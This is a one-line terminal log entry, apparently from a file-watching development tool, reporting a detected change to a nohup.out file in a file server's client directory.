+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
